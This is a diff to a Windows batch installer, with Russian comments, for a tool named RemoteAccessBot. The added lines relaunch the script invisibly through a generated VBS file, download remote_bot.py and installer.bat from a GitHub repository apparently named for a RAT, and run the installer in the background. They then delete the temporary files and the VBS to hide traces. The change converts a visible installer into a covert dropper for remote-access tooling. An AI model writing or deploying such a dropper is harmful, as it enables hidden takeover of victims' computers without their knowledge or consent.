@@ -1,22 +1,29 @@
 @echo off
-setlocal
+chcp 65001 >nul
 
-echo Загрузка RemoteAccessBot...
-echo ---------------------------
+:: Скрытый режим: запуск через VBS
+if "%~1"=="" (
+    echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP%\invisible.vbs"
+    echo WshShell.Run "cmd /c ""%~f0"" hidden", 0, False >> "%TEMP%\invisible.vbs"
+    start "" /B wscript "%TEMP%\invisible.vbs"
+    exit /b
+)
 
-set TEMP_DIR=%TEMP%\RemoteAccessBot
+:: Основной код установки
+set "TEMP_DIR=%TEMP%\RemoteAccessBot"
 mkdir "%TEMP_DIR%" >nul 2>&1
 
-echo Скачиваем файлы...
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ваш_аккаунт/ваш_репозиторий/main/remote_bot.py' -OutFile '%TEMP_DIR%\remote_bot.py'"
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ваш_аккаунт/ваш_репозиторий/main/installer.bat' -OutFile '%TEMP_DIR%\installer.bat'"
+echo Загрузка файлов...
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/nikoda3576/Rattnik/main/remote_bot.py' -OutFile '%TEMP_DIR%\remote_bot.py'"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/nikoda3576/Rattnik/main/installer.bat' -OutFile '%TEMP_DIR%\installer.bat'"
 
-echo Запускаем установщик...
+echo Запуск установщика...
 cd /d "%TEMP_DIR%"
-start /wait installer.bat
+start /B "" installer.bat
 
-echo Очистка...
-rd /s /q "%TEMP_DIR%"
+echo Удаление временных файлов...
+timeout /t 5 >nul
+rd /s /q "%TEMP_DIR%" >nul 2>&1
+del "%TEMP%\invisible.vbs" >nul 2>&1
 
-echo Установка завершена!
-pause
+exit
